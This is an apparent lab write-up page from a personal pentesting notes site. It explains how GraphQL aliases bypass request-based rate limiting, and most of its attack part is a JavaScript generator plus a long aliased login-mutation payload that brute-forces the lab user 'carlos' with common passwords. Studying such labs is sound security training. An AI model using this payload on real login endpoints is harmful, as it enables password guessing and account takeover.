@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;h2 id=&quot;bypassing-rate-limiting-using-aliases&quot;&gt;Bypassing rate limiting using aliases&lt;/h2&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <h2 id="bypassing-rate-limiting-using-aliases">Bypassing rate limiting using aliases</h2>
+
+<p>Ordinarily, GraphQL objects can’t contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.</p>
+
+<h4 id="more-information">More information</h4>
+
+<p>For more information on GraphQL aliases, see <a href="https://portswigger.net/web-security/graphql/what-is-graphql#aliases">Aliases</a>.</p>
+
+<p>While aliases are intended to limit the number of API calls you need to make, they can also be used to brute force a GraphQL endpoint.</p>
+
+<p>Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.</p>
+
+<p>The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+    </span><span class="err">#Request</span><span class="w"> </span><span class="err">with</span><span class="w"> </span><span class="err">aliased</span><span class="w"> </span><span class="err">queries</span><span class="w">
+
+    </span><span class="err">query</span><span class="w"> </span><span class="err">isValidDiscount($code:</span><span class="w"> </span><span class="err">Int)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="err">isvalidDiscount(code:$code)</span><span class="p">{</span><span class="w">
+            </span><span class="err">valid</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+        </span><span class="err">isValidDiscount</span><span class="mi">2</span><span class="err">:isValidDiscount(code:$code)</span><span class="p">{</span><span class="w">
+            </span><span class="err">valid</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+        </span><span class="err">isValidDiscount</span><span class="mi">3</span><span class="err">:isValidDiscount(code:$code)</span><span class="p">{</span><span class="w">
+            </span><span class="err">valid</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>GraphQL objects can’t contain multiple properties with the same name. For example, the following query is invalid because it tries to return the product type twice.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="err">#Invalid</span><span class="w"> </span><span class="err">query</span><span class="w">
+    </span><span class="err">query</span><span class="w"> </span><span class="err">getProductDetails</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="err">getProduct(id:</span><span class="w"> </span><span class="mi">1</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="err">id</span><span class="w">
+            </span><span class="err">name</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+        </span><span class="err">getProduct(id:</span><span class="w"> </span><span class="mi">2</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="err">id</span><span class="w">
+            </span><span class="err">name</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#Valid</span><span class="w"> </span><span class="err">query</span><span class="w"> </span><span class="err">using</span><span class="w"> </span><span class="err">aliases</span><span class="w">
+    </span><span class="err">query</span><span class="w"> </span><span class="err">getProductDetails</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="err">product</span><span class="mi">1</span><span class="err">:</span><span class="w"> </span><span class="err">getProduct(id:</span><span class="w"> </span><span class="s2">"1"</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="err">id</span><span class="w">
+            </span><span class="err">name</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+        </span><span class="err">product</span><span class="mi">2</span><span class="err">:</span><span class="w"> </span><span class="err">getProduct(id:</span><span class="w"> </span><span class="s2">"2"</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="err">id</span><span class="w">
+            </span><span class="err">name</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="err">#Response</span><span class="w"> </span><span class="err">to</span><span class="w"> </span><span class="err">query</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"product1"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+                </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Juice Extractor"</span><span class="w">
+             </span><span class="p">},</span><span class="w">
+            </span><span class="nl">"product2"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w">
+                </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Fruit Overlays"</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Aplica una función a a cada par de valores índice : contraseña, tiene que llamar con un alias distinto a cada par</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nf">copy</span><span class="p">(</span><span class="s2">`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">,</span><span class="dl">'</span><span class="p">).</span><span class="nf">map</span><span class="p">((</span><span class="nx">element</span><span class="p">,</span><span class="nx">index</span><span class="p">)</span><span class="o">=&gt;</span><span class="s2">` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `</span><span class="p">.</span><span class="nf">replaceAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">$index</span><span class="dl">'</span><span class="p">,</span><span class="nx">index</span><span class="p">).</span><span class="nf">replaceAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">$password</span><span class="dl">'</span><span class="p">,</span><span class="nx">element</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">));</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">The query has been copied to your clipboard.</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Mejor :</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="s2">`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`</span>
+  <span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">,</span><span class="dl">'</span><span class="p">)</span>
+  <span class="p">.</span><span class="nf">map</span><span class="p">((</span><span class="nx">password</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="o">=&gt;</span> 
+    <span class="s2">`bruteforce</span><span class="p">${</span><span class="nx">index</span><span class="p">}</span><span class="s2">:login(input:{password: "</span><span class="p">${</span><span class="nx">password</span><span class="p">}</span><span class="s2">", username: "carlos"}) { token success }`</span>
+  <span class="p">)</span>
+  <span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">The query has been copied to your clipboard.</span><span class="dl">"</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>payload final, importante ponerle nombre a la operación  (mutation login )</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">mutation</span><span class="w"> </span><span class="err">login</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">0</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"123456"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">1</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"password"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">2</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"12345678"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">3</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"qwerty"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">4</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"123456789"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">5</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"12345"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">6</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"1234"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">7</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"111111"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">8</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"1234567"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">9</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"dragon"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">10</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"123123"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">11</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"baseball"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">12</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"abc123"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">13</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"football"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">14</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"monkey"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">15</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"letmein"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">16</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"shadow"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">17</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"master"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">18</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"666666"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">19</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"qwertyuiop"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">20</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"123321"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">21</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"mustang"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">22</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"1234567890"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">23</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"michael"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">24</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"654321"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">25</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"superman"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">26</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"1qaz2wsx"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">27</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"7777777"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">28</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"121212"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">29</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"000000"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">30</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"qazwsx"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">31</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"123qwe"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">32</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"killer"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
+    </span><span class="err">success</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+  </span><span class="err">bruteforce</span><span class="mi">33</span><span class="err">:</span><span class="w"> </span><span class="err">login(input:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">password:</span><span class="w"> </span><span class="s2">"trustno1"</span><span class="p">,</span><span class="w"> </span><span class="err">username:</span><span class="w"> </span><span class="s2">"carlos"</span><span class="w"> </span><span class="p">}</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">token</span><span class="w">
